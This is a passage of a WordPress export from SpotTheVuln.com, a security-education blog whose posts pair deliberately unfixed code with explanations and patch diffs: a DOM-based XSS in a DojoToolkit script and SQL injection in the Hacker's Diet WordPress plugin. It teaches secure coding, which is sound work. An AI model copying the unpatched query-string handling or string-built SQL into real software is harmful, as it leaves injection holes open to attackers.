		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>603</wp:comment_id>
			<wp:comment_author><![CDATA[Brett Hardin]]></wp:comment_author>
			<wp:comment_author_email>hardin.brett+spotthevuln@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://misc-security.com</wp:comment_author_url>
			<wp:comment_author_IP>208.97.228.241</wp:comment_author_IP>
			<wp:comment_date>2010-08-11 11:57:34</wp:comment_date>
			<wp:comment_date_gmt>2010-08-11 18:57:34</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Glad you like it! We work hard to help developers understand how to identify problems with their code. Let us know if you have any other ideas that can help.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>583</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>575</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Nails &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/07/nails-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-07-23 08:07:19</wp:comment_date>
			<wp:comment_date_gmt>2010-07-23 15:07:19</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Nails [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>583</wp:comment_id>
			<wp:comment_author><![CDATA[school grants]]></wp:comment_author>
			<wp:comment_author_email>asdfjieieie@asdf.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>168.172.251.253</wp:comment_author_IP>
			<wp:comment_date>2010-07-27 17:38:53</wp:comment_date>
			<wp:comment_date_gmt>2010-07-28 00:38:53</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[found your site on del.icio.us today and really liked it.. i bookmarked it and will be back to check it out some more later]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Nails - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/07/nails-cross-site-scripting/</link>
		<pubDate>Fri, 23 Jul 2010 15:00:46 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=962</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: DojoToolkit

Fixed in Version: 1.4.2

Issue Type: XSS

Original Code: <a title="Nails" href="http://spotthevuln.com/2010/07/nails/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s vulnerability is a DOM based XSS that could be found in a JavaScript file provided by the DojoToolkit.  This JavaScript file was included (via script src) in many pages throughout the DojoToolkit, making those pages vulnerable to XSS.  Unlike traditional XSS bugs, server side processing is not required for certain types of DOM based XSS.  This is an important concept to understand as some code auditors will skip static pages assuming the attacker will not have the ability to control any values used by the page.

The bug starts here:
<blockquote>if(window.location.href.indexOf("?") &gt; -1){</blockquote>
The JavaScript pulls the address of the loaded page and checks to see if the address contains the “?” character.  If the “?” character is found, the JavaScript begins parsing and splitting the URI into various arrays.  This parsing and splitting is done in the lines provided below:
<blockquote>var str = window.location.href.substr(window.location.href.indexOf("?")+1).split(/#/);
var ary  = str[0].split(/&amp;/);
for(var i=0; i&lt;ary.length; i++){
var split = ary[i].split(/=/),</blockquote>
The vulnerable assignment occurs here:
<blockquote><span style="color: #ff0000;">value </span>= split[1];</blockquote>
The JavaScript above essentially grabs a querystring value (attacker supplied) and assigns it to the “value” variable.  Later, the “value” variable is used in several places, for example:
<blockquote>dojo.config.locale = locale = value;

document.getElementsByTagName("html")[0].dir = value;

<span style="color: #ff0000;">theme </span>= <span style="color: #ff0000;">value</span>;</blockquote>
Considering the assignments listed above, we have a couple different variables that are tainted.  I've highlighted the tainted variables in red.  Tracing the “theme” assignment shown above, we see the tainted value being passed to a document.write statement, resulting in XSS.
<blockquote>var <span style="color: #ff0000;">themeCss </span>= d.moduleUrl("dijit.themes",theme+"/"+<span style="color: #ff0000;">theme</span>+".css");

var <span style="color: #ff0000;">themeCssRtl </span>= d.moduleUrl("dijit.themes",theme+"/"+<span style="color: #ff0000;">theme</span>+"_rtl.css");

document.write('&lt;link rel="stylesheet" type="text/css" href="'+<span style="color: #ff0000;">themeCss</span>+'"&gt;');

document.write('&lt;link rel="stylesheet" type="text/css" href="'+<span style="color: #ff0000;">themeCssRtl</span>+'"&gt;');</blockquote>
The patch checked in by the DojoToolkit team sanitizes the “value” JavaScript variable by allowing only word characters (^\w).
<h2>Developers Solution</h2>
[cce lang="diff"]

if(window.location.href.indexOf("?") &gt; -1){
var str =  window.location.href.substr(window.location.href.indexOf("?")+1).split(/#/);
var ary  = str[0].split(/&amp;/);
for(var i=0; i&lt;ary.length; i++){
var split = ary[i].split(/=/),
key = split[0],
-value = split[1];
+value = split[1].replace(/[^\w]/g, ""); // replace() to prevent XSS attack
switch(key){
case "locale":
// locale string | null
dojo.config.locale = locale = value;
break;
case "dir":
// rtl | null
document.getElementsByTagName("html")[0].dir = value;
break;
case "theme":
// tundra | soria | noir | squid | nihilo | null
theme = value;
break;
case "a11y":
if(value){ testMode = "dijit_a11y"; }
}
}
}

// always include the default theme files:
if(theme || testMode){

if(theme){
var themeCss = d.moduleUrl("dijit.themes",theme+"/"+theme+".css");
var themeCssRtl =  d.moduleUrl("dijit.themes",theme+"/"+theme+"_rtl.css");
document.write('&lt;link rel="stylesheet" type="text/css"  href="'+themeCss+'"&gt;');
document.write('&lt;link rel="stylesheet" type="text/css"  href="'+themeCssRtl+'"&gt;');
}

if(dojo.config.parseOnLoad){
dojo.config.parseOnLoad = false;
dojo.config._deferParsing = true;
}

d.addOnLoad(function(){

// set the classes
var b = dojo.body();
if(theme){
dojo.removeClass(b, defTheme);
if(!d.hasClass(b, theme)){ d.addClass(b, theme); }
var n = d.byId("themeStyles");
if(n){ d.destroy(n); }
}
if(testMode){ d.addClass(b, testMode); }
if(dojo.config._deferParsing){
// attempt to elimiate race condition introduced by this
// test helper file.  120ms to allow CSS to finish/process?
setTimeout(dojo.hitch(d.parser, "parse", b), 120);
}

});
}

})();

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>962</wp:post_id>
		<wp:post_date>2010-07-23 08:00:46</wp:post_date>
		<wp:post_date_gmt>2010-07-23 15:00:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>nails-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="document-write"><![CDATA[document write]]></category>
		<category domain="category" nicename="dojo"><![CDATA[DoJo]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="category" nicename="javascript"><![CDATA[JavaScript]]></category>
		<category domain="post_tag" nicename="security-flaws"><![CDATA[security flaws]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7539691333be600038fa2ff6a4991658]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cEDGlu]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>584</wp:comment_id>
			<wp:comment_author><![CDATA[alexpolo]]></wp:comment_author>
			<wp:comment_author_email>bh8921@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://polprav.blogspot.com/</wp:comment_author_url>
			<wp:comment_author_IP>188.187.102.74</wp:comment_author_IP>
			<wp:comment_date>2010-07-29 06:34:43</wp:comment_date>
			<wp:comment_date_gmt>2010-07-29 13:34:43</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[it was very interesting to read spotthevuln.com
I want to quote your post in my blog. It can?
And you et an account on Twitter?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>602</wp:comment_id>
			<wp:comment_author><![CDATA[Brett Hardin]]></wp:comment_author>
			<wp:comment_author_email>hardin.brett+spotthevuln@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://misc-security.com</wp:comment_author_url>
			<wp:comment_author_IP>208.97.228.241</wp:comment_author_IP>
			<wp:comment_date>2010-08-11 11:55:00</wp:comment_date>
			<wp:comment_date_gmt>2010-08-11 18:55:00</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Alex,

Feel free to quote the blog. Just make sure to point a link back to the original post.

Brett]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Reboot</title>
		<link>http://spotthevuln.com/2010/07/reboot/</link>
		<pubDate>Mon, 26 Jul 2010 15:00:07 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=968</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>After all, computers crash, people die, relationships fall  apart. The best we can do is breathe and reboot.</strong>
<strong> -Sarah Jessica Parker
</strong></blockquote>
[ccnLe_php]
&lt;?php
include (dirname(__FILE__)."/jpgraph/jpgraph.php");
include (dirname(__FILE__)."/jpgraph/jpgraph_line.php");
include (dirname(__FILE__)."/jpgraph/jpgraph_scatter.php");

// get our db settings without loading all of wordpress every save
$html = implode('', file("../../../wp-config.php"));
$html = str_replace ("require_once", "// ", $html);
$html = str_replace ("&lt;?php", "", $html);
$html = str_replace ("?&gt;", "", $html);
eval($html);

mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
mysql_select_db(DB_NAME);

$weeks = $_GET["weeks"];
$start_date = $_GET["start_date"];
$end_date = $_GET["end_date"];
$goal = $_GET["goal"];
$user_id = $_GET["user"];
$maint_mode = $_GET["maint_mode"];

if ($weeks) {
$query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date &gt;\"".date("Y-m-d", strtotime("$weeks weeks ago"))."\" order by date asc";
} else if ($start_date and $end_date) {
$query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date &gt;=\"$start_date\" and date &lt;= \"$end_date\" order by date asc";
}

result = mysql_query($query);
if (mysql_num_rows($result)) {
if (mysql_num_rows($result) == 1) {
// only one day, gotta finagle the display

$row = mysql_fetch_assoc($result);

// fake day before
$weight_data[] = 0;
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
$x_data[] = date("n/j", strtotime("yesterday", strtotime($row["date"])));

// data
$weight_data[] = $row["weight"];
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
$x_data[] = date("n/j", strtotime($row["date"]));

// fake day after
$weight_data[] = 0;
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
$x_data[] = date("n/j", strtotime("tomorrow", strtotime($row["date"])));
} else {
$num_rows = mysql_num_rows($result);
if ($num_rows &lt;= 7 * 2) { // 0-2 weeks
$ticks = "daily";
} else if ($num_rows &lt;= 31 * 4) { // 2 weeks - 4 months
$ticks = "weekly";
} else { // 4 months +
$ticks = "monthly";
}

$count = 1;
while ($row = mysql_fetch_assoc($result)) {
$weight_data[] = $row["weight"];
$trend_data[] = $row["trend"];
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
switch ($ticks) {
case "weekly":
if ($count == 1) {
$x_data[] = date("n/j", strtotime($row["date"]));
} else {
$x_data[] = "";
if ($count == 7) {
$count = 0;
}
}
break;
case "monthly":
if (date("j", strtotime($row["date"])) == "1") {
$x_data[] = date("n/j", strtotime($row["date"]));
} else {
$x_data[] = "";
}
break;
case "daily":
default:
$x_data[] = date("n/j", strtotime($row["date"]));
break;
}

$count++;
}
}

... &lt;snip&gt;
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>968</wp:post_id>
		<wp:post_date>2010-07-26 08:00:07</wp:post_date>
		<wp:post_date_gmt>2010-07-26 15:00:07</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>reboot</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[de049d209c90da6f8e9aacfde913f5df]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cXILoT]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Auto Draft]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Auto Draft]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>585</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Reboot &#8211; SQL Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/07/reboot-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-07-30 08:23:27</wp:comment_date>
			<wp:comment_date_gmt>2010-07-30 15:23:27</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Reboot [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Reboot – SQL Injection</title>
		<link>http://spotthevuln.com/2010/07/reboot-sql-injection/</link>
		<pubDate>Fri, 30 Jul 2010 15:23:21 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=972</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: The Hacker's Diet (Wordpress Plugin)

Fixed in Version: 0.9.7b

Issue Type: SQL Injection

Original Code: <a title="reboot" href="http://spotthevuln.com/2010/07/reboot/" target="_blank">Found    Here</a>
<h2>Description</h2>
This week’s vulnerability was a SQL injection vulnerability affecting the Hacker’s Diet Wordpress plugin.  In the vulnerable version, the plugin assigns several variables using values obtained directly from the querystring.  The variable assignments are shown below:
<blockquote>$weeks = $_GET["weeks"];
$start_date = $_GET["start_date"];
$end_date = $_GET["end_date"];
$goal = $_GET["goal"];
$user_id = $_GET["user"];
$maint_mode = $_GET["maint_mode"];</blockquote>
No sanitization or validation is done before assigning the values.  Once the assignments are made, the attacker controlled values are then passed to a dynamic SQL string here resulting in SQL Injection:
<blockquote>$query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date &gt; \"".date("Y-m-d", strtotime("$weeks weeks ago"))."\" order by date asc";

$query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date &gt;= \"$start_date\" and date &lt;= \"$end_date\" order by date asc";</blockquote>
The plugin authors patched this vulnerability by validating that the $_GET[“user”] and $_GET[“weeks”] parameters contains only numeric characters.  An interesting exercise would be to trace through the code and find where the following variables are being used:
<blockquote>
$start_date = $_GET["start_date"];
$end_date = $_GET["end_date"];
$goal = $_GET["goal"];
$maint_mode = $_GET["maint_mode"];</blockquote>
<h2>Developers Solution</h2>
[cce lang="diff"]
&lt;?php
include (dirname(__FILE__)."/jpgraph/jpgraph.php");
include (dirname(__FILE__)."/jpgraph/jpgraph_line.php");
include (dirname(__FILE__)."/jpgraph/jpgraph_scatter.php");

// get our db settings without loading all of wordpress every save
$html = implode('', file("../../../wp-config.php"));
$html = str_replace ("require_once", "// ", $html);
$html = str_replace ("&lt;?php", "", $html);
$html = str_replace ("?&gt;", "", $html);
eval($html);

mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
mysql_select_db(DB_NAME);

+if (!is_numeric($_GET["user"]) || !is_numeric($_GET["weeks"])) {
+   exit;
+}

$weeks = $_GET["weeks"];
$start_date = $_GET["start_date"];
$end_date = $_GET["end_date"];
$goal = $_GET["goal"];
$user_id = $_GET["user"];
$maint_mode = $_GET["maint_mode"];

if ($weeks) {
-       $query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date &gt; \"".date("Y-m-d", strtotime("$weeks weeks ago"))."\" order by date asc";
+       $query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = \"" . $user_id . "\" and date &gt; \"".date("Y-m-d", strtotime("$weeks weeks ago"))."\" order by date asc";
} else if ($start_date and $end_date) {
-       $query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date &gt;= \"$start_date\" and date &lt;= \"$end_date\" order by date asc";
+       $query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = \"" . $user_id . "\" and date &gt;= \"$start_date\" and date &lt;= \"$end_date\" order by date asc";
}

result = mysql_query($query);
if (mysql_num_rows($result)) {
if (mysql_num_rows($result) == 1) {
// only one day, gotta finagle the display

$row = mysql_fetch_assoc($result);

// fake day before
$weight_data[] = 0;
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
$x_data[] = date("n/j", strtotime("yesterday", strtotime($row["date"])));

// data
$weight_data[] = $row["weight"];
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
$x_data[] = date("n/j", strtotime($row["date"]));

// fake day after
$weight_data[] = 0;
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
$x_data[] = date("n/j", strtotime("tomorrow", strtotime($row["date"])));
} else {
$num_rows = mysql_num_rows($result);
if ($num_rows &lt;= 7 * 2) { // 0-2 weeks
$ticks = "daily";
} else if ($num_rows &lt;= 31 * 4) { // 2 weeks - 4 months
$ticks = "weekly";
} else { // 4 months +
$ticks = "monthly";
}

$count = 1;
while ($row = mysql_fetch_assoc($result)) {
$weight_data[] = $row["weight"];
$trend_data[] = $row["trend"];
if ($goal &gt; 0) {
$goal_data[] = $goal;
}
switch ($ticks) {
case "weekly":
if ($count == 1) {
$x_data[] = date("n/j", strtotime($row["date"]));
} else {
$x_data[] = "";
if ($count == 7) {
$count = 0;
}
}
break;
case "monthly":
if (date("j", strtotime($row["date"])) == "1") {
$x_data[] = date("n/j", strtotime($row["date"]));
} else {
$x_data[] = "";
}
break;
case "daily":
default:
$x_data[] = date("n/j", strtotime($row["date"]));
break;
}

$count++;
}
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>972</wp:post_id>
		<wp:post_date>2010-07-30 08:23:21</wp:post_date>
		<wp:post_date_gmt>2010-07-30 15:23:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>reboot-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="post_tag" nicename="numeric-characters"><![CDATA[numeric characters]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="post_tag" nicename="querystring"><![CDATA[querystring]]></category>
		<category domain="post_tag" nicename="sanitization"><![CDATA[sanitization]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-string"><![CDATA[sql string]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress-plugin"><![CDATA[wordpress plugin]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[87e96d15d286736e2c2efe3bc5c27d1a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cN0sAu]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Burnout</title>
		<link>http://spotthevuln.com/2010/08/burnout/</link>
		<pubDate>Mon, 02 Aug 2010 15:00:28 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=978</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Better to burn out than rust out</strong><strong>.</strong>
<strong> -Neil Young
</strong></blockquote>
[ccnLe_php]
// log all requests to register on our blog
function ttc_add_to_log( $user, $error)
{

global $wpdb;
